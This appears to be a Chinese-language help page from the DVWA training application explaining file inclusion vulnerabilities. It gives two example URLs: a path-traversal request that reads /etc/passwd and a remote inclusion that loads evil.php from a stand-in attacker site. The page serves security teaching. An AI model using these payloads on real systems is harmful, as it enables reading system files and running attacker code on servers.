<div class="body_padded">
	<h1>帮助 - 文件包含</h1>
	
	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">

		<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一些web应用程序允许用户指定输入，直接使用文件流，或允许用户上传文件到服务器。然后用户可以通过web应用程序访问这些的内容
		 这样做会导致Web应用程序存在恶意文件包含的漏洞。</p>
		
		<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;比如本地文件包含: http://127.0.0.1/dvwa/fi/?page=../../../../../../etc/passwd</p>
		
		<p>或者</p>
		
		<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;远程文件包含: http://127.0.0.1/dvwa/fi/?page=http://www.evilsite.com/evil.php</p>
		
	</div></td>
	</tr>
	</table>
	
	</div>
	
	<br />
	
	<p>参考链接: http://www.owasp.org/index.php/Top_10_2007-A3</p>

</div>
		